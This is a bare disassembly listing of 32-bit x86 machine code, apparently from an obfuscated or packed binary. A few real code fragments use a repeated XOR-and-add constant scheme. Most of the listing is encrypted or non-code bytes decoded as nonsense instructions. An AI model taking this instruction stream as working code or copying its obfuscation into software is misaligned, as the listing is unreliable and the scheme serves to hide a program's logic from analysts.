  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x767c6d70
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	xchg   esp,eax
  40cc4f:	leave  
  40cc50:	aam    0xf8
  40cc52:	test   al,bh
  40cc54:	inc    ebx
  40cc55:	ret    0x8ab
  40cc58:	push   0xfec9f2ee
  40cc5d:	sti    
  40cc5e:	fbstp  TBYTE PTR [edx-0x715c7729]
  40cc64:	sub    edi,DWORD PTR [esi-0x49e58e9e]
  40cc6a:	and    BYTE PTR [edi-0x3f],bh
  40cc6d:	mov    edx,0x52f14440
  40cc72:	shl    bh,0xff
  40cc75:	retf   0x7601
  40cc78:	pop    esp
  40cc79:	loop   0x40cc15
  40cc7b:	mov    al,ds:0xb797edc
  40cc80:	(bad)  
  40cc81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc82:	adc    DWORD PTR [ecx-0x22],ecx
  40cc85:	cmp    al,BYTE PTR [edx+0x4bf91faa]
  40cc8b:	add    edx,DWORD PTR [ecx+0x81b4b6a]
  40cc91:	in     al,dx
  40cc92:	pushf  
  40cc93:	icebp  
  40cc94:	lods   eax,DWORD PTR ds:[esi]
  40cc95:	cdq    
  40cc96:	sub    eax,0xe4dcbffd
  40cc9b:	rcl    DWORD PTR [esi-0x1921767b],0x6d
  40cca2:	xor    eax,0xf7ff472f
  40cca7:	or     al,0xb7
  40cca9:	adc    eax,0xf224d837
  40ccae:	and    DWORD PTR [esi+ebp*1],ecx
  40ccb1:	cs scas al,BYTE PTR es:[edi]
  40ccb3:	xchg   edi,eax
  40ccb4:	mov    ds:0x6ac147c3,al
  40ccb9:	sbb    al,0x98
  40ccbb:	ret    0xced9
  40ccbe:	pop    ecx
  40ccbf:	ja     0x40cce9
  40ccc1:	dec    ebp
  40ccc2:	add    ecx,DWORD PTR [edi+0x2f6c9c97]
  40ccc8:	mov    al,0x19
  40ccca:	(bad)  
  40cccb:	in     al,dx
  40cccc:	test   BYTE PTR [ecx+0x57],ch
  40cccf:	(bad)  
  40ccd0:	(bad)  
  40ccd2:	or     DWORD PTR [ecx+0x7d],edx
  40ccd5:	sub    al,0x9
  40ccd7:	or     BYTE PTR [ebp+0x76882a94],bl
  40ccdd:	fldcw  WORD PTR [ebx]
  40ccdf:	add    ebp,DWORD PTR [edx-0x38]
  40cce2:	sub    cl,BYTE PTR [ecx-0x322fac59]
  40cce8:	mov    ecx,0x398e085b
  40cced:	sar    BYTE PTR [edi],0x47
  40ccf0:	les    esi,FWORD PTR [edi]
  40ccf2:	test   eax,0xa62fdb3d
  40ccf7:	jl     0x40cc86
  40ccf9:	and    eax,0x34c69d5e
  40ccfe:	add    BYTE PTR [edx],al
  40cd00:	sub    al,0x28
  40cd02:	dec    eax
  40cd03:	sahf   
  40cd04:	dec    ecx
  40cd05:	mov    ch,0x1d
  40cd07:	ja     0x40ccd8
  40cd09:	shl    BYTE PTR [edx],cl
  40cd0b:	mov    bl,BYTE PTR [esi]
  40cd0d:	out    dx,eax
  40cd0e:	and    bh,ah
  40cd10:	sub    BYTE PTR [edi+0x2eed3458],ch
  40cd16:	das    
  40cd17:	dec    esp
  40cd18:	sahf   
  40cd19:	add    ebp,edx
  40cd1b:	ss xchg esi,eax
  40cd1d:	(bad)  
  40cd1e:	repnz test DWORD PTR [ebx],edx
  40cd21:	ins    BYTE PTR es:[edi],dx
  40cd22:	mov    BYTE PTR [ebp+0x66],dh
  40cd25:	in     al,dx
  40cd26:	into   
  40cd27:	push   ebp
  40cd28:	enter  0x3abf,0x5b
  40cd2c:	xchg   DWORD PTR [ecx],edi
  40cd2e:	sbb    ebx,edi
  40cd30:	test   al,0x97
  40cd32:	sbb    al,0x43
  40cd34:	adc    DWORD PTR [esi+edx*4],edx
  40cd37:	out    0x91,eax
  40cd39:	xchg   ebp,eax
  40cd3a:	sbb    eax,0x4aa09e85
  40cd3f:	and    eax,0xbb120ef2
  40cd44:	das    
  40cd45:	aad    0x56
  40cd47:	in     eax,dx
  40cd48:	imul   esi,ebx,0x844f8503
  40cd4e:	ds jmp 0x6156:0x31a48c6e
  40cd56:	push   0xffffffce
  40cd58:	scas   al,BYTE PTR es:[edi]
  40cd59:	adc    bl,BYTE PTR cs:[edx-0x4840fd53]
  40cd60:	inc    edx
  40cd61:	(bad)  
  40cd62:	mov    al,ds:0xb71ca0e7
  40cd67:	or     al,0xf0
  40cd69:	mov    ebx,0x7e162a20
  40cd6e:	shl    BYTE PTR [ecx-0x12],1
  40cd71:	inc    esi
  40cd72:	mov    cl,ah
  40cd74:	mov    ah,0x6
  40cd76:	jae    0x40cd40
  40cd78:	sbb    BYTE PTR [esi+0x38],ch
  40cd7b:	loope  0x40cd92
  40cd7d:	inc    ebp
  40cd7e:	stos   BYTE PTR es:[edi],al
  40cd7f:	adc    edi,DWORD PTR [esi]
  40cd81:	sbb    eax,0x97bd2baa
  40cd86:	jl     0x40cdaa
  40cd88:	cmp    BYTE PTR [edx-0x6630d7da],ah
  40cd8e:	mov    ah,0x8c
  40cd90:	bnd jno 0x40cdab
  40cd93:	ret    
  40cd94:	jle    0x40cdbc
  40cd96:	push   edi
  40cd97:	scas   eax,DWORD PTR es:[edi]
  40cd98:	sar    DWORD PTR [esi],1
  40cd9a:	pop    ss
  40cd9b:	out    0xfd,al
  40cd9d:	xor    al,0xfb
  40cd9f:	mov    cl,0x89
  40cda1:	push   eax
  40cda2:	add    al,0x68
  40cda4:	aas    
  40cda5:	or     al,ah
  40cda7:	cmp    DWORD PTR [esi+0x1a],ecx
  40cdaa:	dec    esp
  40cdab:	jns    0x40cdcb
  40cdad:	mov    ah,0x5a
  40cdaf:	sbb    eax,ecx
  40cdb1:	enter  0xf9a5,0x63
  40cdb5:	test   al,0x8a
  40cdb7:	xor    BYTE PTR [edi+esi*8+0x1fa73055],ch
  40cdbe:	cmp    ebx,ecx
  40cdc0:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40cdc2:	mov    ds:0x2701e47f,al
  40cdc7:	add    eax,0x8a1751b6
  40cdcc:	int    0x46
  40cdce:	test   al,0xf8
  40cdd0:	jge    0x40ce48
  40cdd2:	and    DWORD PTR [edx],ecx
  40cdd4:	mov    dl,0xe1
  40cdd6:	and    DWORD PTR [edi],ecx
  40cdd8:	repnz sbb BYTE PTR [esi-0x6798912a],dh
  40cddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cde0:	cmp    eax,0x4f1aa3d
  40cde5:	push   edx
  40cde6:	jle    0x40ce55
  40cde8:	out    dx,al
  40cde9:	mov    ds:0xd7891591,al
  40cdee:	jge    0x40ce03
  40cdf0:	add    DWORD PTR [eax],esi
  40cdf2:	(bad)  
  40cdf3:	mov    fs,WORD PTR [edi-0x70e831cb]
  40cdf9:	or     BYTE PTR [esi+0x15],bl
  40cdfc:	les    edi,FWORD PTR [ecx-0x11ed1b81]
  40ce02:	repz mov bl,BYTE PTR [esp+ebx*4]
  40ce06:	dec    ecx
  40ce07:	out    dx,al
  40ce08:	jecxz  0x40cdab
  40ce0a:	mov    esi,0xa6e51cd8
  40ce0f:	adc    dh,BYTE PTR [eax]
  40ce11:	and    BYTE PTR gs:[ebp-0x6b],ch
  40ce15:	jl     0x40cdb2
  40ce17:	or     dl,0xfb
  40ce1a:	retf   
  40ce1b:	mov    ebx,0xa347a48d
  40ce20:	retf   
  40ce21:	fisub  DWORD PTR [ebp-0x154f3166]
  40ce27:	jb     0x40ce37
  40ce29:	mov    ch,0x84
  40ce2b:	pop    ebx
  40ce2c:	xchg   ebx,eax
  40ce2d:	bnd call edx
  40ce30:	jbe    0x40cde4
  40ce32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce33:	pop    ds
  40ce34:	outs   dx,BYTE PTR ds:[esi]
  40ce35:	in     eax,dx
  40ce36:	inc    eax
  40ce37:	pop    esp
  40ce38:	dec    esp
  40ce39:	test   al,0x3d
  40ce3b:	test   eax,0xd0c8586a
  40ce40:	jns    0x40ce17
  40ce42:	sub    BYTE PTR [ecx+0xb],dh
  40ce45:	je     0x40ce1a
  40ce47:	les    ebx,FWORD PTR [eax+0x4b]
  40ce4a:	enter  0xfae5,0x32
  40ce4e:	pop    es
  40ce4f:	push   eax
  40ce50:	fild   WORD PTR [ebx-0x4]
  40ce53:	jbe    0xe7edd003
  40ce59:	jbe    0x40ce5b
  40ce5b:	ret    0xb213
  40ce5e:	rcr    ebx,0xa7
  40ce61:	adc    BYTE PTR [edi-0x69c043cf],0xd0
  40ce68:	xchg   esi,eax
  40ce69:	stos   DWORD PTR es:[edi],eax
  40ce6a:	pop    edi
  40ce6b:	(bad)  
  40ce6c:	int3   
  40ce6d:	sbb    BYTE PTR [edi-0x50],dl
  40ce70:	test   BYTE PTR [ecx+0x67],cl
  40ce73:	es cli 
  40ce75:	inc    eax
  40ce76:	enter  0xe45b,0x9b
  40ce7a:	pop    ss
  40ce7b:	adc    dl,bh
  40ce7d:	xchg   ecx,eax
  40ce7e:	xor    eax,0x82236fb7
  40ce83:	clc    
  40ce84:	enter  0x1d76,0x7f
  40ce88:	shl    BYTE PTR [eax],0x16
  40ce8b:	js     0x40cefd
  40ce8d:	loop   0x40ce33
  40ce8f:	ins    DWORD PTR es:[edi],dx
  40ce90:	das    
  40ce91:	test   eax,0x8f70bc77
  40ce96:	imul   edi,DWORD PTR [edx+0x15c9f8bb],0x7c
  40ce9d:	enter  0xc0fa,0x2
  40cea1:	imul   ebx,DWORD PTR [edi-0x53],0x9d3ce8cc
  40cea8:	add    dh,al
  40ceaa:	adc    dh,dh
  40ceac:	not    BYTE PTR [eax-0x53]
  40ceaf:	cmc    
  40ceb0:	in     eax,dx
  40ceb1:	push   ebp
  40ceb2:	push   ss
  40ceb3:	adc    BYTE PTR [esi+edx*4+0x50bf57f4],al
  40ceba:	xlat   BYTE PTR ds:[ebx]
  40cebb:	add    BYTE PTR [eax+0x279bf2ff],ch
  40cec1:	retf   
  40cec2:	in     al,0x72
  40cec4:	inc    ebx
  40cec5:	add    al,0x22
  40cec7:	add    DWORD PTR [ebx],eax
  40cec9:	dec    esi
  40ceca:	push   cs
  40cecb:	pop    esp
  40cecc:	inc    edx
  40cecd:	push   ecx
  40cece:	dec    eax
  40cecf:	mov    esi,0x2d8a1da5
  40ced4:	test   eax,0x6d3540e9
  40ced9:	mov    esi,DWORD PTR [edi-0x75]
  40cedc:	inc    ebp
  40cedd:	or     dl,BYTE PTR [eax+edx*1-0x61a12566]
  40cee4:	sub    eax,0x62a7d047
  40cee9:	arpl   dx,cx
  40ceeb:	add    BYTE PTR [eax+0x12219a01],dl
  40cef1:	popf   
  40cef2:	lods   eax,DWORD PTR ds:[esi]
  40cef3:	push   ebp
  40cef4:	and    DWORD PTR [ecx-0x534e5d40],0x58
  40cefb:	shl    bl,0x22
  40cefe:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40cf00:	jbe    0x40ceff
  40cf02:	popf   
  40cf03:	inc    ecx
  40cf04:	lods   eax,DWORD PTR ds:[esi]
  40cf05:	loope  0x40ced4
  40cf07:	adc    BYTE PTR [ecx+ebp*4+0x1e5e1c78],bh
  40cf0e:	clc    
  40cf0f:	(bad)  
  40cf10:	rol    bl,1
  40cf12:	cmp    BYTE PTR [esi-0x6b7ae3db],cl
  40cf18:	bound  ebp,QWORD PTR [ecx]
  40cf1a:	jae    0x40cf7d
  40cf1c:	xchg   edi,eax
  40cf1d:	push   edi
  40cf1e:	out    0xc9,al
  40cf20:	(bad)  
  40cf21:	paddusw mm6,QWORD PTR [edx-0xd]
  40cf25:	and    eax,esp
  40cf27:	jae    0x40cf34
  40cf29:	adc    WORD PTR [esi+0x4cafdd59],bx
  40cf30:	jns    0x40cf1a
  40cf32:	mov    eax,ds:0xc4b37b80
  40cf37:	mov    al,ds:0x21ccdcf2
  40cf3c:	and    al,0x54
  40cf3e:	add    dh,dl
  40cf40:	lods   eax,DWORD PTR ds:[esi]
  40cf41:	inc    ebp
  40cf42:	xchg   ebp,eax
  40cf43:	loope  0x40cf77
  40cf45:	pop    eax
  40cf46:	shr    eax,0x22
  40cf49:	icebp  
  40cf4a:	arpl   dx,sp
  40cf4c:	pusha  
  40cf4d:	jne    0x40cf38
  40cf4f:	mov    DWORD PTR [eax-0x75],edi
  40cf52:	inc    ebp
  40cf53:	or     al,0x3
  40cf55:	inc    ebp
  40cf56:	or     BYTE PTR [ecx+0x458bf045],cl
  40cf5c:	in     al,0x85
  40cf5e:	ror    BYTE PTR [edi],0x84
  40cf61:	push   0x10
  40cf63:	add    BYTE PTR [eax],al
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0x79
  40cf80:	sub    dl,al
  40cf82:	jbe    0x40cfa5
  40cf84:	xchg   esi,eax
  40cf85:	jle    0x40d005
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	xchg   ecx,eax
  40cf8c:	xor    eax,0xb7cdd22d
  40cf91:	cmc    
  40cf92:	sub    eax,0x66cf6870
  40cf97:	(bad)  
  40cf98:	mov    eax,0x91668c39
  40cf9d:	in     eax,dx
  40cf9e:	cmp    al,0xbf
  40cfa0:	mov    ecx,0x6c523116
  40cfa5:	mov    eax,ds:0x4dfca847
  40cfaa:	fild   WORD PTR ds:0xdb23f7a1
  40cfb0:	outs   dx,BYTE PTR ds:[esi]
  40cfb1:	mov    DWORD PTR [edx+0x68],eax
  40cfb4:	cdq    
  40cfb5:	outs   dx,DWORD PTR ds:[esi]
  40cfb6:	mov    ecx,0x47f9265a
  40cfbb:	cs pop ds
  40cfbd:	cmp    BYTE PTR [ebx],ch
  40cfbf:	mov    ebp,0x30a0afc9
  40cfc4:	xchg   BYTE PTR [edx+0x43],al
  40cfc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfc8:	mov    ebx,0xcf5c6695
  40cfcd:	mov    ss,ebx
  40cfcf:	out    dx,eax
  40cfd0:	retf   0x3279
  40cfd3:	jp     0x40d007
  40cfd5:	cmp    ebp,esp
  40cfd7:	outs   dx,BYTE PTR ds:[esi]
  40cfd8:	mov    eax,DWORD PTR [ebx-0x31]
  40cfdb:	in     al,dx
  40cfdc:	arpl   WORD PTR [esi],cx
  40cfde:	mov    bl,0xcb
  40cfe0:	mov    DWORD PTR [esi-0x20],eax
  40cfe3:	scas   eax,DWORD PTR es:[edi]
  40cfe4:	jmp    0x40cff6
  40cfe6:	sbb    eax,0x4c3ebdb
  40cfeb:	les    esi,FWORD PTR [ebp-0x58]
  40cfee:	shl    BYTE PTR [ebp-0x7737d438],cl
  40cff4:	das    
  40cff5:	ror    BYTE PTR [eax-0x54d4944b],cl
  40cffb:	xor    ch,al
  40cffd:	inc    esi
  40cffe:	iret   
  40cfff:	jnp    0x40d000
  40d001:	pop    eax
  40d002:	mov    esi,DWORD PTR ds:0x4a045186
  40d008:	add    eax,0x6a573ef9
  40d00d:	mov    al,0xdc
  40d00f:	push   ebx
  40d010:	aad    0xca
  40d012:	rol    DWORD PTR [eax-0x74],cl
  40d015:	push   edx
  40d016:	push   ebp
  40d017:	pop    esi
  40d018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d019:	cmp    al,0xea
  40d01b:	mov    esp,DWORD PTR [ebp-0x25d13b91]
  40d021:	pop    ecx
  40d022:	push   esi
  40d023:	sub    ebx,DWORD PTR [ebx]
  40d025:	cmp    eax,0x3621de06
  40d02a:	lds    ebx,FWORD PTR [esi*8-0x38e5fe58]
  40d031:	adc    DWORD PTR [ebx-0x38],eax
  40d034:	sub    edi,DWORD PTR [ecx+0x347e552]
  40d03a:	test   eax,0x57cfa39f
  40d03f:	(bad)  
  40d040:	in     eax,dx
  40d041:	adc    BYTE PTR ds:0xe1e5b125,cl
  40d047:	inc    esp
  40d048:	icebp  
  40d049:	nop
  40d04a:	inc    edi
  40d04b:	hlt    
  40d04c:	dec    ebx
  40d04d:	dec    edi
  40d04e:	test   al,0x8d
  40d050:	stos   BYTE PTR es:[di],al
  40d052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d053:	push   es
  40d054:	push   es
  40d055:	xor    eax,0xc4fefba7
  40d05a:	test   DWORD PTR [edi],ebx
  40d05c:	loop   0x40cffa
  40d05e:	call   0xc701:0xdb252d89
  40d065:	add    DWORD PTR [esi-0x2345a913],ebx
  40d06b:	and    bl,cl
  40d06d:	int    0xff
  40d06f:	std    
  40d070:	mov    ebp,0xb2fdde07
  40d075:	scas   eax,DWORD PTR es:[edi]
  40d076:	cld    
  40d077:	or     al,0x7d
  40d079:	cs pop ss
  40d07b:	jmp    eax
  40d07d:	out    dx,eax
  40d07e:	pop    ebx
  40d07f:	cmp    BYTE PTR [eax+0x165831fd],bl
  40d085:	cmp    ah,bh
  40d087:	dec    DWORD PTR [ebx-0x15b94700]
  40d08d:	sub    al,0x12
  40d08f:	fidivr DWORD PTR [edx+0x637408e3]
  40d095:	call   0xb124:0xe8b93c2c
  40d09c:	stc    
  40d09d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d09e:	dec    ebx
  40d09f:	sub    eax,DWORD PTR [edx]
  40d0a1:	jns    0x40d118
  40d0a3:	sbb    al,0x48
  40d0a5:	dec    ebp
  40d0a6:	mov    ds:0x98cb1fbc,al
  40d0ab:	jbe    0x40d11c
  40d0ad:	int    0x48
  40d0af:	xchg   BYTE PTR [ebx-0x14],ch
  40d0b2:	outs   dx,DWORD PTR ds:[esi]
  40d0b3:	mov    ecx,0xc02c1529
  40d0b8:	and    ebx,esi
  40d0ba:	jb     0x40d0a6
  40d0bc:	push   ebp
  40d0bd:	js     0x40d0bd
  40d0bf:	not    BYTE PTR [eax+0x6da5dfbb]
  40d0c5:	cld    
  40d0c6:	rcl    BYTE PTR [eax-0x4],1
  40d0c9:	aas    
  40d0ca:	mov    ch,bh
  40d0cc:	outs   dx,BYTE PTR ds:[esi]
  40d0cd:	popa   
  40d0ce:	pop    ecx
  40d0cf:	mov    edi,0x682ac62d
  40d0d4:	push   edi
  40d0d5:	add    dl,BYTE PTR [eax+0x33efaf7a]
  40d0db:	push   esp
  40d0dc:	test   al,0x90
  40d0de:	and    eax,0xe223c8ca
  40d0e3:	adc    BYTE PTR [edi+0x75],al
  40d0e6:	sbb    esi,DWORD PTR [esi]
  40d0e8:	retf   
  40d0e9:	dec    esp
  40d0ea:	mov    eax,0x8ad66107
  40d0ef:	das    
  40d0f0:	(bad)  [ecx]
  40d0f2:	out    0xa0,al
  40d0f4:	cwde   
  40d0f5:	inc    BYTE PTR [edx+0x2e5c371]
  40d0fb:	imul   edx,DWORD PTR [esi-0x19],0xf148da93
  40d102:	mov    edi,0x7b885f6f
  40d107:	mov    DWORD PTR [edx+0xf],ebx
  40d10a:	iret   
  40d10b:	add    DWORD PTR [edx+eax*1+0x45],eax
  40d10f:	dec    esi
  40d110:	and    eax,0x3b8daa84
  40d115:	repnz inc edx
  40d117:	xor    BYTE PTR [eax-0x2028da68],dl
  40d11d:	jno    0x40d146
  40d11f:	push   esp
  40d120:	and    al,0x28
  40d122:	add    al,0x1a
  40d124:	std    
  40d125:	mov    ch,0xb8
  40d127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d128:	lods   eax,DWORD PTR ds:[esi]
  40d129:	cmp    edx,DWORD PTR [eax]
  40d12b:	les    ebp,FWORD PTR [ebx]
  40d12d:	xor    DWORD PTR [eax+edx*2-0x47],0xffffffc0
  40d132:	jne    0x40d173
  40d134:	int3   
  40d135:	cli    
  40d136:	repnz in eax,0x37
  40d139:	sbb    eax,0x61518645
  40d13e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d13f:	adc    DWORD PTR [ebp+0x4da8522e],esp
  40d145:	inc    esp
  40d146:	mov    bh,0x63
  40d148:	push   0xffffffaa
  40d14a:	add    DWORD PTR [eax-0x4dcedb9],0xffffff8e
  40d151:	outs   dx,DWORD PTR ds:[esi]
  40d152:	cwde   
  40d153:	inc    ecx
  40d154:	cmp    al,0xad
  40d156:	sbb    al,0x97
  40d158:	cld    
  40d159:	popa   
  40d15a:	nop
  40d15b:	div    bh
  40d15d:	adc    al,0x5d
  40d15f:	mov    WORD PTR [edx-0x20],?
  40d162:	mov    dl,0x20
  40d164:	add    BYTE PTR [ebp+0x357e8535],cl
  40d16a:	imul   esp,DWORD PTR ds:0x2cc27d88,0xffffffbe
  40d171:	call   0xaeda:0x6c96bbfc
  40d178:	lock sub DWORD PTR [edx],ebx
  40d17b:	sub    ecx,DWORD PTR [ebx]
  40d17d:	dec    esi
  40d17e:	fimul  WORD PTR [eax+0x79]
  40d181:	dec    eax
  40d182:	lds    edx,FWORD PTR [edi]
  40d184:	xor    al,0xe8
  40d186:	repnz fimul DWORD PTR [eax]
  40d189:	test   eax,0x20c2cb2d
  40d18e:	stos   DWORD PTR es:[edi],eax
  40d18f:	mov    gs,edi
  40d191:	xchg   bh,dh
  40d193:	mov    ebp,0xf987a6d2
  40d198:	iret   
  40d199:	sub    eax,0x25251e39
  40d19e:	or     esp,esi
  40d1a0:	adc    DWORD PTR [ecx+0x48f4730f],0xffffff81
  40d1a7:	jmp    0x70d753e0
  40d1ac:	sbb    BYTE PTR ds:[eax+0x25],dh
  40d1b0:	cdq    
  40d1b1:	inc    edx
  40d1b2:	lock loope 0x40d20e
  40d1b5:	popa   
  40d1b6:	out    0x0,eax
  40d1b8:	mov    ebx,DWORD PTR [ecx-0x19]
  40d1bb:	dec    esp
  40d1bc:	ins    DWORD PTR es:[edi],dx
  40d1bd:	fdivr  QWORD PTR [edi]
  40d1bf:	stos   DWORD PTR es:[edi],eax
  40d1c0:	or     BYTE PTR [ecx+0x1a1507c9],0xce
  40d1c7:	inc    eax
  40d1c8:	sub    al,0xff
  40d1ca:	inc    ecx
  40d1cb:	sbb    al,0xbd
  40d1cd:	iret   
  40d1ce:	mov    ebx,0xd63bfe9
  40d1d3:	mov    ?,eax
  40d1d5:	ret    0xe7f3
  40d1d8:	jl     0x40d161
  40d1da:	(bad)  
  40d1db:	sbb    al,0x30
  40d1dd:	pop    esp
  40d1de:	push   ebx
  40d1df:	fisubr WORD PTR [ebx]
  40d1e1:	(bad)  
  40d1e2:	je     0x40d20d
  40d1e4:	cmp    DWORD PTR [edx-0x691dc571],esi
  40d1ea:	scas   eax,DWORD PTR es:[edi]
  40d1eb:	leave  
  40d1ec:	mov    edx,0x895c39e1
  40d1f1:	pop    ecx
  40d1f2:	cmp    eax,0xcb2005cb
  40d1f7:	gs mov ch,0x3c
  40d1fa:	das    
  40d1fb:	inc    ebp
  40d1fc:	mov    dl,0xe9
  40d1fe:	dec    edi
  40d1ff:	and    BYTE PTR [edx+0x18f52570],dl
  40d205:	popf   
  40d206:	jne    0x40d1ba
  40d208:	inc    esi
  40d209:	test   edx,ecx
  40d20b:	push   esp
  40d20c:	pop    ds
  40d20d:	mov    eax,0x3c7009d
  40d212:	mov    al,0xdc
  40d214:	inc    ebx
  40d215:	loop   0x40d230
  40d217:	repz test BYTE PTR [ebx+0x20bbd35f],cl
  40d21e:	imul   edx,DWORD PTR [esi+eiz*8],0xe16f5337
  40d225:	jb     0x40d29c
  40d227:	jnp    0x40d1dd
  40d229:	add    dh,BYTE PTR [esi-0x1da4cc04]
  40d22f:	adc    bh,BYTE PTR [edi]
  40d231:	mov    esi,DWORD PTR [esi]
  40d233:	ror    BYTE PTR [ebx+0x0],1
  40d236:	push   edi
  40d237:	scas   al,BYTE PTR es:[edi]
  40d238:	jo     0x40d1c9
  40d23a:	ret    0x7c14
  40d23d:	bound  esi,QWORD PTR [esp+ebx*2]
  40d240:	(bad)  
  40d241:	jne    0x40d21c
  40d243:	test   eax,0xbabd0884
  40d248:	popa   
  40d249:	xor    BYTE PTR [ebp+0x6],0xb0
  40d24d:	cld    
  40d24e:	les    esp,FWORD PTR [ebx-0x10]
  40d251:	gs int3 
  40d253:	dec    edi
  40d254:	cmp    eax,0xd22734df
  40d259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d25a:	jae    0x40d290
  40d25c:	push   ebx
  40d25d:	das    
  40d25e:	sbb    eax,0x323ec945
  40d263:	out    dx,eax
  40d264:	les    eax,FWORD PTR [esi+0x39]
  40d267:	inc    BYTE PTR [esi]
  40d269:	or     dh,BYTE PTR [edi+0x3a]
  40d26c:	sbb    edi,DWORD PTR [eax+0x23]
  40d26f:	arpl   WORD PTR [eax+0x73ae39f7],cx
  40d275:	mov    esp,0x82130294
  40d27a:	adc    DWORD PTR [ebx+0x4a],eax
  40d27d:	arpl   WORD PTR [edi],di
  40d27f:	leave  
  40d280:	inc    esp
  40d281:	test   BYTE PTR ds:0x97c9c056,bl
  40d287:	fs mov edi,0x25907694
  40d28d:	aad    0x5b
  40d28f:	xchg   ebx,ecx
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	gs (bad) 
  40d2d2:	pcmpgtb mm5,QWORD PTR [edx*4+0x7d7d7e7e]
  40d2da:	jle    0x40d35a
  40d2dc:	pop    ebx
  40d2dd:	sar    esi,0xd1
  40d2e0:	mov    esp,0xb942fc90
  40d2e5:	push   ecx
  40d2e6:	sahf   
  40d2e7:	int    0xa7
  40d2e9:	adc    cl,dh
  40d2eb:	(bad)
  40d2ee:	and    ax,0xdc6b
  40d2f2:	xchg   ecx,eax
  40d2f3:	fdivrp st(5),st
  40d2f5:	adc    DWORD PTR [ecx],esi
  40d2f7:	xchg   BYTE PTR [ebp-0xa],ch
  40d2fa:	out    dx,al
  40d2fb:	in     eax,dx
  40d2fc:	ret    0x1775
  40d2ff:	imul   edi,DWORD PTR [edi+0x21],0xffffffc9
  40d303:	xor    dh,BYTE PTR [edx+0x60]
  40d306:	shr    DWORD PTR [edi],0x8e
  40d309:	adc    ecx,DWORD PTR [ecx-0x38]
  40d30c:	scas   al,BYTE PTR es:[edi]
  40d30d:	jb     0x40d30f
  40d30f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d310:	arpl   WORD PTR [esi+esi*1],si
  40d313:	mov    edx,0xd7d11f9b
  40d318:	pop    ebx
  40d319:	mov    BYTE PTR [eax],al
  40d31b:	xor    DWORD PTR [edi+0x4c],edx
  40d31e:	sar    DWORD PTR ds:0xe4f5ad7f,0xb1
  40d325:	inc    ecx
  40d326:	ins    BYTE PTR es:[edi],dx
  40d327:	ror    BYTE PTR [esi],cl
  40d329:	sub    eax,0x4bdd60fb
  40d32e:	push   cs
  40d32f:	fisubr WORD PTR [edi-0x39d4790b]
  40d335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d336:	cld    
  40d337:	shl    ecx,cl
  40d339:	xchg   edi,eax
  40d33a:	sbb    bl,BYTE PTR [esi-0x2]
  40d33d:	cdq    
  40d33e:	mov    esp,0x6cba4e97
  40d343:	xor    al,0x15
  40d345:	cmc    
  40d346:	dec    esp
  40d347:	add    ecx,DWORD PTR [ebx]
  40d349:	test   eax,0xef404b19
  40d34e:	and    eax,eax
  40d350:	mov    bh,0x80
  40d352:	mov    al,ds:0x3bf3a257
  40d357:	call   DWORD PTR [ebx]
